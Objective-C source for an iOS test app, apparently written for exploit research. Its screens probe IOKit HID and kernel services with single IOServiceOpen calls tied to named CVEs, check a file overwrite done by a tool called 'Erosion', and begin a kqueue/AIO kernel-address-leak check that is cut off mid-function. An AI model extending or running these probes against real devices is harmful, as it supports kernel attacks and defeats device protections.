#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>


@interface ContainerChangeController : UIViewController
@property(nonatomic,strong) UITextView *details;
@property(nonatomic,strong) UILabel *colorDisplay;
@end
@implementation ContainerChangeController
- (NSURL *)targetURL {
    NSURL *documents = [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] firstObject];
    return [documents URLByAppendingPathComponent:@"erosion-color-test.txt" isDirectory:NO];
}
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"File Change Test";
    self.view.backgroundColor = UIColor.systemBackgroundColor;
    UILabel *intro = [UILabel new];
    intro.translatesAutoresizingMaskIntoConstraints = NO;
    intro.numberOfLines = 0;
    intro.text = @"This app reads a text file in its own Documents folder. Replace that file with Erosion, then tap Reload. Expected values: RED, GREEN, or BLUE.";
    [self.view addSubview:intro];
    self.colorDisplay = [UILabel new];
    self.colorDisplay.translatesAutoresizingMaskIntoConstraints = NO;
    self.colorDisplay.font = [UIFont boldSystemFontOfSize:30];
    self.colorDisplay.textAlignment = NSTextAlignmentCenter;
    self.colorDisplay.layer.cornerRadius = 14;
    self.colorDisplay.clipsToBounds = YES;
    [self.view addSubview:self.colorDisplay];
    UIButton *reload = [UIButton buttonWithType:UIButtonTypeSystem];
    reload.translatesAutoresizingMaskIntoConstraints = NO;
    [reload setTitle:@"Reload file" forState:UIControlStateNormal];
    [reload addTarget:self action:@selector(reloadFile:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:reload];
    UIButton *copy = [UIButton buttonWithType:UIButtonTypeSystem];
    copy.translatesAutoresizingMaskIntoConstraints = NO;
    [copy setTitle:@"Copy file path" forState:UIControlStateNormal];
    [copy addTarget:self action:@selector(copyPath:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:copy];
    self.details = [UITextView new];
    self.details.translatesAutoresizingMaskIntoConstraints = NO;
    self.details.editable = NO;
    self.details.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    [self.view addSubview:self.details];
    UILayoutGuide *g = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [intro.topAnchor constraintEqualToAnchor:g.topAnchor constant:16],
        [intro.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
        [intro.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
        [self.colorDisplay.topAnchor constraintEqualToAnchor:intro.bottomAnchor constant:20],
        [self.colorDisplay.leadingAnchor constraintEqualToAnchor:intro.leadingAnchor],
        [self.colorDisplay.trailingAnchor constraintEqualToAnchor:intro.trailingAnchor],
        [self.colorDisplay.heightAnchor constraintEqualToConstant:110],
        [reload.topAnchor constraintEqualToAnchor:self.colorDisplay.bottomAnchor constant:15],
        [reload.leadingAnchor constraintEqualToAnchor:intro.leadingAnchor],
        [copy.centerYAnchor constraintEqualToAnchor:reload.centerYAnchor],
        [copy.trailingAnchor constraintEqualToAnchor:intro.trailingAnchor],
        [self.details.topAnchor constraintEqualToAnchor:reload.bottomAnchor constant:8],
        [self.details.leadingAnchor constraintEqualToAnchor:intro.leadingAnchor],
        [self.details.trailingAnchor constraintEqualToAnchor:intro.trailingAnchor],
        [self.details.bottomAnchor constraintEqualToAnchor:g.bottomAnchor constant:-10]
    ]];
    NSURL *url = [self targetURL];
    if (![[NSFileManager defaultManager] fileExistsAtPath:url.path]) {
        NSError *writeError = nil;
        [@"BLUE\n" writeToURL:url atomically:YES encoding:NSUTF8StringEncoding error:&writeError];
        if (writeError) self.details.text = [NSString stringWithFormat:@"Initial file creation failed: %@",writeError];
    }
    [self reloadFile:nil];
}
- (void)copyPath:(id)sender {
    [UIPasteboard generalPasteboard].string = [self targetURL].path;
}
- (void)reloadFile:(id)sender {
    NSURL *url = [self targetURL];
    NSError *error = nil;
    NSString *content = [NSString stringWithContentsOfURL:url encoding:NSUTF8StringEncoding error:&error];
    NSString *value = [[content ?: @"" stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] uppercaseString];
    NSDictionary *colors = @{@"RED":UIColor.systemRedColor, @"GREEN":UIColor.systemGreenColor, @"BLUE":UIColor.systemBlueColor};
    UIColor *color = colors[value];
    self.colorDisplay.backgroundColor = color ?: UIColor.secondarySystemBackgroundColor;
    self.colorDisplay.textColor = color ? UIColor.whiteColor : UIColor.labelColor;
    self.colorDisplay.text = color ? value : @"INVALID / MISSING";
    self.details.text = [NSString stringWithFormat:
       @"File path:\n%@\n\nRaw content:\n%@\n\nRead error:\n%@\n\nUse Erosion File Operations → grant access to this file → import a plain text file containing GREEN or RED → overwrite → return and tap Reload.\n\nNo files outside this app are touched by the test.",
       url.path, content ?: @"(none)", error.localizedDescription ?: @"none"];
}
@end



/*
 * IOHIDFamily reachability check
 *
 * Based on the public IOHIDFamily connection type
 * kIOHIDLibUserClientConnectManager = 0x00484944 ("HID").
 * This checks only ordinary service discovery and connection creation.
 * No external selectors, IOConnectCall*, malformed buffers or racing.
 */
typedef NS_ENUM(NSInteger, HIDTestMode) {
    HIDTestModeServices = 0,
    HIDTestModeInventory = 1,
    HIDTestModeManagerClasses = 2,
    HIDTestModeFastPath = 3
};

@interface HIDReachabilityController : UIViewController
@property(nonatomic,strong) UITextView *output;
@property(nonatomic,strong) UIButton *runButton;
@property(nonatomic,strong) UIButton *inventoryButton;
@property(nonatomic,strong) UIButton *classCheckButton;
@property(nonatomic,strong) UIButton *fastPathButton;
@property(nonatomic,copy) NSString *lastLog;
@property(nonatomic,assign) HIDTestMode testMode;
- (instancetype)initWithTestMode:(HIDTestMode)mode;
@end

@implementation HIDReachabilityController
- (instancetype)initWithTestMode:(HIDTestMode)mode {
    self = [super initWithNibName:nil bundle:nil];
    if (self) _testMode = mode;
    return self;
}
- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.systemBackgroundColor;

    NSString *descriptionText = nil;
    NSString *buttonText = nil;
    SEL action = NULL;
    switch (self.testMode) {
        case HIDTestModeServices:
            self.title = @"HID Services";
            buttonText = @"Check service reachability once";
            descriptionText = @"Checks registered IOHID families and at most one normal HID manager connection. No external selectors.";
            action = @selector(runCheck:);
            break;
        case HIDTestModeInventory:
            self.title = @"HID Provider Inventory";
            buttonText = @"Inventory providers";
            descriptionText = @"Read-only registry enumeration of HID providers. No connections are opened.";
            action = @selector(inventoryProviders:);
            break;
        case HIDTestModeManagerClasses:
            self.title = @"HID Manager Classes";
            buttonText = @"Check 3 other manager classes";
            descriptionText = @"One standard manager-type open per representative HID device class. Earlier denied AppleSPUHIDDevice is skipped.";
            action = @selector(checkOtherHIDClasses:);
            break;
        case HIDTestModeFastPath:
            self.title = @"FastPath Type 2";
            buttonText = @"Check AOPTouch type 2 once";
            descriptionText = @"Tests a single AOPTouchHIDDriver type-2 open and closes it immediately. No selectors, memory writes or races. An open is NOT an exploit.";
            action = @selector(checkFastPathOnce:);
            break;
    }

    UILabel *description = [UILabel new];
    description.translatesAutoresizingMaskIntoConstraints = NO;
    description.numberOfLines = 0;
    description.font = [UIFont preferredFontForTextStyle:UIFontTextStyleSubheadline];
    description.text = descriptionText;

    UIButton *startButton = [UIButton buttonWithType:UIButtonTypeSystem];
    startButton.translatesAutoresizingMaskIntoConstraints = NO;
    [startButton setTitle:buttonText forState:UIControlStateNormal];
    [startButton addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    switch (self.testMode) {
        case HIDTestModeServices: self.runButton = startButton; break;
        case HIDTestModeInventory: self.inventoryButton = startButton; break;
        case HIDTestModeManagerClasses: self.classCheckButton = startButton; break;
        case HIDTestModeFastPath: self.fastPathButton = startButton; break;
    }

    UIButton *copyButton = [UIButton buttonWithType:UIButtonTypeSystem];
    copyButton.translatesAutoresizingMaskIntoConstraints = NO;
    [copyButton setTitle:@"Copy results" forState:UIControlStateNormal];
    [copyButton addTarget:self action:@selector(copyLog:) forControlEvents:UIControlEventTouchUpInside];

    self.output = [UITextView new];
    self.output.translatesAutoresizingMaskIntoConstraints = NO;
    self.output.editable = NO;
    self.output.selectable = YES;
    self.output.backgroundColor = UIColor.secondarySystemBackgroundColor;
    self.output.layer.cornerRadius = 10;
    self.output.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    self.output.text = @"Not run on this page. Existing on-device results are already documented. Do not repeat a test unless there is a specific reason.";

    [self.view addSubview:description];
    [self.view addSubview:startButton];
    [self.view addSubview:copyButton];
    [self.view addSubview:self.output];
    UILayoutGuide *guide = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [description.topAnchor constraintEqualToAnchor:guide.topAnchor constant:16],
        [description.leadingAnchor constraintEqualToAnchor:guide.leadingAnchor constant:16],
        [description.trailingAnchor constraintEqualToAnchor:guide.trailingAnchor constant:-16],
        [startButton.topAnchor constraintEqualToAnchor:description.bottomAnchor constant:16],
        [startButton.leadingAnchor constraintEqualToAnchor:description.leadingAnchor],
        [copyButton.centerYAnchor constraintEqualToAnchor:startButton.centerYAnchor],
        [copyButton.trailingAnchor constraintEqualToAnchor:description.trailingAnchor],
        [self.output.topAnchor constraintEqualToAnchor:startButton.bottomAnchor constant:12],
        [self.output.leadingAnchor constraintEqualToAnchor:description.leadingAnchor],
        [self.output.trailingAnchor constraintEqualToAnchor:description.trailingAnchor],
        [self.output.bottomAnchor constraintEqualToAnchor:guide.bottomAnchor constant:-12]
    ]];
}

- (void)copyLog:(id)sender {
    [UIPasteboard generalPasteboard].string = self.lastLog ?: self.output.text;
}

/*
 * Enumerates registered service classes only. There is no IOServiceOpen,
 * IOConnectCall, HID report, shared memory access or repeated selector use.
 */
- (void)inventoryProviders:(id)sender {
    self.runButton.enabled = NO;
    self.inventoryButton.enabled = NO;
    self.output.text = @"Enumerating registered HID providers (read-only)...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"HID Provider Inventory v1\nTimestamp (UTC): %@\nOS: %@\n\n",
            [NSDate date], UIDevice.currentDevice.systemVersion];
        for (NSString *family in @[@"IOHIDDevice", @"IOHIDEventService", @"IOHIDSystem"]) {
            io_iterator_t iterator = IO_OBJECT_NULL;
            kern_return_t result = IOServiceGetMatchingServices(
                kIOMainPortDefault, IOServiceMatching(family.UTF8String), &iterator);
            [log appendFormat:@"%@ | enumeration=0x%08x (%d)\n",
                family, (unsigned int)result, (int)result];
            if (result != KERN_SUCCESS || iterator == IO_OBJECT_NULL) {
                if (iterator != IO_OBJECT_NULL) IOObjectRelease(iterator);
                continue;
            }
            NSMutableDictionary<NSString *, NSNumber *> *counts = [NSMutableDictionary new];
            NSUInteger seen = 0;
            const NSUInteger maxProviders = 64;
            io_service_t entry = IO_OBJECT_NULL;
            while (seen < maxProviders && (entry = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
                io_name_t rawClass = {0};
                kern_return_t classResult = IOObjectGetClass(entry, rawClass);
                NSString *concrete = classResult == KERN_SUCCESS ?
                    [NSString stringWithUTF8String:rawClass] : @"CLASS_UNAVAILABLE";
                if (concrete.length == 0) concrete = @"CLASS_UNAVAILABLE";
                counts[concrete] = @([counts[concrete] unsignedIntegerValue] + 1);
                seen++;
                IOObjectRelease(entry);
            }
            IOObjectRelease(iterator);
            [log appendFormat:@"Observed: %lu (max %lu); concrete classes: %lu\n",
                (unsigned long)seen, (unsigned long)maxProviders, (unsigned long)counts.count];
            NSArray<NSString *> *names =
                [[counts allKeys] sortedArrayUsingSelector:@selector(compare:)];
            for (NSString *name in names) {
                [log appendFormat:@"  %@ | count=%@\n", name, counts[name]];
            }
            if (seen == maxProviders)
                [log appendString:@"  LIMIT REACHED; more providers may exist\n"];
            [log appendString:@"\n"];
        }
        [log appendString:@"Registry enumeration only: zero connection attempts, external selectors or HID reports.\nCVE-2026-112515 is not confirmed to involve these providers.\n"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
            self.inventoryButton.enabled = YES;
        });
    });
}


/*
 * Class-specific access check based on observed 23E261 inventory.
 *
 * The earlier probe already found a denied AppleSPUHIDDevice connection.
 * Do not repeat that probe. Enumerate at most 64 IOHIDDevice providers
 * and attempt one documented-type IOServiceOpen for the first match of
 * each of the three remaining concrete classes. Close immediately.
 * No IOConnectCall*, HID reports, shared memory, or racing.
 */
- (void)checkOtherHIDClasses:(id)sender {
    self.runButton.enabled = NO;
    self.inventoryButton.enabled = NO;
    self.classCheckButton.enabled = NO;  // one-shot per screen instance
    self.output.text = @"Checking three other HID device classes once...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSArray<NSString *> *targets = @[
            @"AppleHIDTransportHIDDevice",
            @"AppleWirelessChargingDevice",
            @"IOHIDUserDevice"
        ];
        NSMutableSet<NSString *> *completed = [NSMutableSet new];
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"HID Class Access v2\nTimestamp (UTC): %@\nOS: %@\nBundle: %@\n\n",
             [NSDate date], UIDevice.currentDevice.systemVersion,
             NSBundle.mainBundle.bundleIdentifier ?: @"unknown"];
        [log appendString:@"AppleSPUHIDDevice | SKIPPED (previously denied 0xe00002e2)\n"];
        io_iterator_t iterator = IO_OBJECT_NULL;
        kern_return_t matchResult = IOServiceGetMatchingServices(
            kIOMainPortDefault, IOServiceMatching("IOHIDDevice"), &iterator);
        [log appendFormat:@"IOHIDDevice | enumeration=0x%08x\n", (unsigned int)matchResult];

        if (matchResult == KERN_SUCCESS && iterator != IO_OBJECT_NULL) {
            const NSUInteger maxVisited = 64;
            NSUInteger visited = 0;
            io_service_t entry = IO_OBJECT_NULL;
            while (visited < maxVisited && completed.count < targets.count &&
                   (entry = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
                visited++;
                io_name_t className = {0};
                kern_return_t classResult = IOObjectGetClass(entry, className);
                NSString *name = classResult == KERN_SUCCESS ?
                    [NSString stringWithUTF8String:className] : nil;
                if (name != nil && [targets containsObject:name] &&
                    ![completed containsObject:name]) {
                    [completed addObject:name];
                    io_connect_t connection = IO_OBJECT_NULL;
                    const uint32_t type = 0x00484944u;
                    kern_return_t result = IOServiceOpen(
                        entry, mach_task_self(), type, &connection);
                    [log appendFormat:@"%@ | type=0x%08x | open=0x%08x (%d)\n",
                         name, type, (unsigned int)result, (int)result];
                    if (connection != IO_OBJECT_NULL) IOServiceClose(connection);
                }
                IOObjectRelease(entry);
            }
            [log appendFormat:@"Visited: %lu (limit %lu)\n",
                 (unsigned long)visited, (unsigned long)maxVisited];
        }
        if (iterator != IO_OBJECT_NULL) IOObjectRelease(iterator);

        for (NSString *name in targets) {
            if (![completed containsObject:name]) {
                [log appendFormat:@"%@ | open=NOT_ATTEMPTED (no matched provider within bound)\n", name];
            }
        }
        [log appendString:@"\nExactly one normal connection attempt per matched target class; successful connections immediately closed. No external selectors, HID reports, shared memory or racing.\nConnection success is NOT proof of CVE-2026-112515, kernel access, or injection.\n"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
            self.inventoryButton.enabled = YES;
            // Keep classCheckButton disabled: no repeated opens on this screen.
        });
    });
}


/*
 * Independent access prerequisite for the publicly documented
 * IOHIDEventServiceFastPathUserClient (CVE-2026-28992 research lead).
 * Apple's iPadOS 26.5 advisory confirms an IOHIDFamily locking fix.
 * The published third-party analysis uses IOServiceOpen(type 2).
 *
 * Absolutely no user-client selectors, entitlement dictionaries, or race
 * sequences from the public panic PoC are invoked. One service, one open
 * attempt, immediate close, and no retries in this screen instance.
 */
- (void)checkFastPathOnce:(id)sender {
    self.runButton.enabled = NO;
    self.inventoryButton.enabled = NO;
    self.classCheckButton.enabled = NO;
    self.fastPathButton.enabled = NO;
    self.output.text = @"Checking one FastPath connection (no method calls)...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"HID FastPath Open-Only v1\nTimestamp (UTC): %@\nOS: %@\n\n",
             [NSDate date], UIDevice.currentDevice.systemVersion];
        io_iterator_t iterator = IO_OBJECT_NULL;
        kern_return_t status = IOServiceGetMatchingServices(
            kIOMainPortDefault, IOServiceMatching("IOHIDEventService"), &iterator);
        [log appendFormat:@"IOHIDEventService | enumeration=0x%08x\n", (unsigned int)status];
        BOOL found = NO;
        if (status == KERN_SUCCESS && iterator != IO_OBJECT_NULL) {
            io_service_t service = IO_OBJECT_NULL;
            NSUInteger seen = 0;
            while (seen < 64 && (service = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
                seen++;
                io_name_t raw = {0};
                kern_return_t cls = IOObjectGetClass(service, raw);
                NSString *name = cls == KERN_SUCCESS ?
                    [NSString stringWithUTF8String:raw] : nil;
                if ([name isEqualToString:@"AOPTouchHIDDriver"]) {
                    found = YES;
                    io_connect_t connection = IO_OBJECT_NULL;
                    const uint32_t fastPathType = 2u;
                    kern_return_t result = IOServiceOpen(
                        service, mach_task_self(), fastPathType, &connection);
                    [log appendFormat:@"%@ | type=%u | open=0x%08x (%d)\n",
                         name, fastPathType, (unsigned int)result, (int)result];
                    if (connection != IO_OBJECT_NULL) IOServiceClose(connection);
                    IOObjectRelease(service);
                    break;
                }
                IOObjectRelease(service);
            }
            [log appendFormat:@"Visited: %lu (limit 64)\n", (unsigned long)seen];
        }
        if (iterator != IO_OBJECT_NULL) IOObjectRelease(iterator);
        if (!found) [log appendString:@"AOPTouchHIDDriver | NOT_FOUND_WITHIN_LIMIT | open=NOT_ATTEMPTED\n"];
        [log appendString:@"\nOne ordinary connection attempt at most; immediate close. ZERO external selectors, reports, gate inputs, race iterations, or thread churn.\nCVE-2026-28992's published PoCs are crash/panic demos, NOT controlled kernel read/write; they were NOT reproduced.\nA successful open proves only reachability, not vulnerability or exploitability.\n"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
            self.inventoryButton.enabled = YES;
            self.classCheckButton.enabled = YES;
            // fastPathButton intentionally remains disabled: no repeats.
        });
    });
}

- (void)runCheck:(id)sender {
    self.runButton.enabled = NO;
    self.inventoryButton.enabled = NO;
    self.output.text = @"Checking IOHIDFamily service registration...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"HID Reachability v1\nTimestamp (UTC): %@\nOS: %@\nBundle: %@\n\n",
         [NSDate date], UIDevice.currentDevice.systemVersion,
         NSBundle.mainBundle.bundleIdentifier ?: @"unknown"];

        NSArray<NSString *> *classes = @[@"IOHIDDevice", @"IOHIDEventService", @"IOHIDSystem"];
        for (NSString *name in classes) {
            io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                           IOServiceMatching(name.UTF8String));
            if (service == IO_OBJECT_NULL) {
                [log appendFormat:@"%@ | match=NOT_FOUND | open=NOT_ATTEMPTED\n", name];
                continue;
            }

            io_name_t concreteClass = {0};
            kern_return_t classStatus = IOObjectGetClass(service, concreteClass);
            [log appendFormat:@"%@ | match=FOUND | concrete=%@",
                name, classStatus == KERN_SUCCESS ?
                [NSString stringWithUTF8String:concreteClass] : @"UNAVAILABLE"];

            if ([name isEqualToString:@"IOHIDDevice"]) {
                // Apple IOHIDFamily's published HID manager connection type.
                // Open the first matching service only; close it immediately.
                const uint32_t hidConnectionType = 0x00484944u;
                io_connect_t connection = IO_OBJECT_NULL;
                kern_return_t result = IOServiceOpen(service, mach_task_self(),
                                                       hidConnectionType, &connection);
                [log appendFormat:@" | type=0x%08x | open=0x%08x (%d)\n",
                    hidConnectionType, (unsigned int)result, (int)result];
                if (connection != IO_OBJECT_NULL) IOServiceClose(connection);
            } else {
                [log appendString:@" | open=NOT_ATTEMPTED (discovery only)\n"];
            }
            IOObjectRelease(service);
        }

        [log appendString:@"\nCaution: IOHIDEventServiceUserClient checks a private HID entitlement in published Apple source; it is deliberately not opened here.\nNo external selectors, device reports, shared memory, or kernel-memory operations were attempted.\nAn open connection is an access prerequisite only, not proof of a kernel exploit.\n"];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
            self.inventoryButton.enabled = YES;
        });
    });
}
@end

@interface ProbeController : UIViewController
@property(nonatomic,strong) UITextView *output;
@property(nonatomic,strong) UIButton *runButton;
@property(nonatomic,strong) NSString *lastLog;
@end

@implementation ProbeController
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"Kernel Services";
    self.view.backgroundColor = UIColor.systemBackgroundColor;

    UILabel *heading = [UILabel new];
    heading.translatesAutoresizingMaskIntoConstraints = NO;
    heading.font = [UIFont preferredFontForTextStyle:UIFontTextStyleTitle2];
    heading.text = @"AppleAVE2 access check";
    heading.numberOfLines = 0;
    [self.view addSubview:heading];

    UILabel *description = [UILabel new];
    description.translatesAutoresizingMaskIntoConstraints = NO;
    description.text = @"One normal IOServiceOpen(type 0) per service. No selector calls, memory modification, or racing. ANE is discovery-only.";
    description.font = [UIFont preferredFontForTextStyle:UIFontTextStyleSubheadline];
    description.numberOfLines = 0;
    [self.view addSubview:description];

    self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.runButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.runButton setTitle:@"Run one-time checks" forState:UIControlStateNormal];
    [self.runButton addTarget:self action:@selector(runProbe:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.runButton];

    UIButton *copyButton = [UIButton buttonWithType:UIButtonTypeSystem];
    copyButton.translatesAutoresizingMaskIntoConstraints = NO;
    [copyButton setTitle:@"Copy results" forState:UIControlStateNormal];
    [copyButton addTarget:self action:@selector(copyLog:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:copyButton];

    self.output = [UITextView new];
    self.output.translatesAutoresizingMaskIntoConstraints = NO;
    self.output.editable = NO;
    self.output.selectable = YES;
    self.output.backgroundColor = UIColor.secondarySystemBackgroundColor;
    self.output.layer.cornerRadius = 10;
    self.output.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    self.output.text = @"Press Run to check AppleAVE2Driver and four previously measured services.\nNo checks have run yet.";
    [self.view addSubview:self.output];

    UILayoutGuide *guide = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [heading.topAnchor constraintEqualToAnchor:guide.topAnchor constant:12],
        [heading.leadingAnchor constraintEqualToAnchor:guide.leadingAnchor constant:16],
        [heading.trailingAnchor constraintEqualToAnchor:guide.trailingAnchor constant:-16],
        [description.topAnchor constraintEqualToAnchor:heading.bottomAnchor constant:10],
        [description.leadingAnchor constraintEqualToAnchor:heading.leadingAnchor],
        [description.trailingAnchor constraintEqualToAnchor:heading.trailingAnchor],
        [self.runButton.topAnchor constraintEqualToAnchor:description.bottomAnchor constant:12],
        [self.runButton.leadingAnchor constraintEqualToAnchor:heading.leadingAnchor],
        [copyButton.centerYAnchor constraintEqualToAnchor:self.runButton.centerYAnchor],
        [copyButton.trailingAnchor constraintEqualToAnchor:heading.trailingAnchor],
        [self.output.topAnchor constraintEqualToAnchor:self.runButton.bottomAnchor constant:10],
        [self.output.leadingAnchor constraintEqualToAnchor:heading.leadingAnchor],
        [self.output.trailingAnchor constraintEqualToAnchor:heading.trailingAnchor],
        [self.output.bottomAnchor constraintEqualToAnchor:guide.bottomAnchor constant:-12]
    ]];
}
- (void)copyLog:(id)sender {
    [UIPasteboard generalPasteboard].string = self.lastLog ?: self.output.text;
}
- (void)runProbe:(id)sender {
    self.runButton.enabled = NO;
    self.output.text = @"Checking...";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSMutableString *log = [NSMutableString new];
        [log appendFormat:@"Kernel Service Probe v1\nTimestamp (UTC): %@\nOS: %@\nModel: %@\nBundle: %@\n\n",
         [NSDate date], UIDevice.currentDevice.systemVersion, UIDevice.currentDevice.model,
         NSBundle.mainBundle.bundleIdentifier ?: @"unknown"];
        NSArray<NSString *> *names = @[
           @"AppleAVE2Driver", @"IOSurfaceRoot", @"IOMobileFramebuffer",
           @"AppleMobileFileIntegrity", @"IODTNVRAM"
        ];
        for (NSString *name in names) {
            io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                             IOServiceMatching(name.UTF8String));
            if (service == IO_OBJECT_NULL) {
                [log appendFormat:@"%@ | match=NOT_FOUND | open=NOT_ATTEMPTED\n", name];
                continue;
            }
            [log appendFormat:@"%@ | match=FOUND",name];
            io_connect_t connection = IO_OBJECT_NULL;
            kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
            [log appendFormat:@" | type=0 | open=0x%08x (%d)\n", (unsigned int)kr, (int)kr];
            if (connection != IO_OBJECT_NULL) IOServiceClose(connection);
            IOObjectRelease(service);
        }
        [log appendString:@"\nANE discovery only (NO open):\n"];
        for (NSString *name in @[@"ANEHWDevice"]) {
            io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                            IOServiceMatching(name.UTF8String));
            [log appendFormat:@"%@ | match=%@\n", name,
                service == IO_OBJECT_NULL ? @"NOT_FOUND" : @"FOUND"];
            if (service != IO_OBJECT_NULL) IOObjectRelease(service);
        }
        [log appendString:@"\nInterpretation: opening a service is NOT a kernel exploit or process injection. NOT_FOUND may mean a different registration class, not absence of the driver.\n"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.lastLog = [log copy];
            self.output.text = self.lastLog;
            self.runButton.enabled = YES;
        });
    });
}
@end



/*
 * CVE-2026-84530 AIO/kqueue metadata disclosure, one-shot read-only check.
 * Original research: vschko/CaseStudies/CVE-2026-84530.
 * This creates only an app-owned FIFO and asks for metadata on THIS process's
 * kqueue. It does not invoke malformed selectors, races or kernel writes.
 * A high address in the AIO saved-data field is evidence of the disclosure;
 * absence is a meaningful negative, not a reason to repeat crash tests.
 */
#import <aio.h>
#import <sys/event.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <dlfcn.h>

struct ProbeAIOEvent {
    uint64_t ident; int16_t filter; uint16_t flags; int32_t qos;
    uint64_t udata; uint32_t fflags, xflags; int64_t data; uint64_t ext[4];
};
struct ProbeAIOExtInfo {
    struct ProbeAIOEvent event;
    uint64_t savedData;
    int32_t status, savedFlags;
    uint64_t reserved[2];
};
typedef int (*ProbePidFdInfo)(int, int, int, void *, int);

@interface AIODisclosureController : UIViewController
@property(nonatomic,strong) UITextView *logView;
@property(nonatomic,strong) UIButton *runButton;
@end
@implementation AIODisclosureController
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"AIO Kernel Address";
    self.view.backgroundColor = UIColor.systemBackgroundColor;
    UILabel *message = [UILabel new];
    message.translatesAutoresizingMaskIntoConstraints = NO;
    message.numberOfLines = 0;
    message.font = [UIFont preferredFontForTextStyle:UIFontTextStyleSubheadline];
    message.text = @"CVE-2026-84530: a one-shot read-only test for an AIO "
      "kernel-object address unintentionally exposed through kqueue metadata. "
      "No kernel memory writes, crashes, or SpringBoard edits. "
      "A successful leak is NOT arbitrary kernel memory read/write.";
    self.runButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.runButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.runButton setTitle:@"Run AIO metadata test once"
                    forState:UIControlStateNormal];
    [self.runButton addTarget:self action:@selector(runOnce:)
             forControlEvents:UIControlEventTouchUpInside];
    UIButton *copy = [UIButton buttonWithType:UIButtonTypeSystem];
    copy.translatesAutoresizingMaskIntoConstraints = NO;
    [copy setTitle:@"Copy results" forState:UIControlStateNormal];
    [copy addTarget:self action:@selector(copyResults:)
    forControlEvents:UIControlEventTouchUpInside];
    self.logView = [UITextView new];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.selectable = YES;
    self.logView.backgroundColor = UIColor.secondarySystemBackgroundColor;
    self.logView.layer.cornerRadius = 10;
    self.logView.font = [UIFont monospacedSystemFontOfSize:12
                                             weight:UIFontWeightRegular];
    self.logView.text = @"Not run. Operates on one app-owned FIFO and this process only.";
    [self.view addSubview:message];
    [self.view addSubview:self.runButton];
    [self.view addSubview:copy];
    [self.view addSubview:self.logView];
    UILayoutGuide *g = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
      [message.topAnchor constraintEqualToAnchor:g.topAnchor constant:12],
      [message.leadingAnchor constraintEqualToAnchor:g.leadingAnchor constant:16],
      [message.trailingAnchor constraintEqualToAnchor:g.trailingAnchor constant:-16],
      [self.runButton.topAnchor constraintEqualToAnchor:message.bottomAnchor constant:18],
      [self.runButton.leadingAnchor constraintEqualToAnchor:message.leadingAnchor],
      [copy.centerYAnchor constraintEqualToAnchor:self.runButton.centerYAnchor],
      [copy.trailingAnchor constraintEqualToAnchor:message.trailingAnchor],
      [self.logView.topAnchor constraintEqualToAnchor:self.runButton.bottomAnchor constant:12],
      [self.logView.leadingAnchor constraintEqualToAnchor:message.leadingAnchor],
      [self.logView.trailingAnchor constraintEqualToAnchor:message.trailingAnchor],
      [self.logView.bottomAnchor constraintEqualToAnchor:g.bottomAnchor constant:-12]
    ]];
}
- (void)copyResults:(id)sender {
    UIPasteboard.generalPasteboard.string = self.logView.text ?: @"";
}
- (void)runOnce:(id)sender {
    if (!self.runButton.enabled) return;
    self.runButton.enabled = NO;
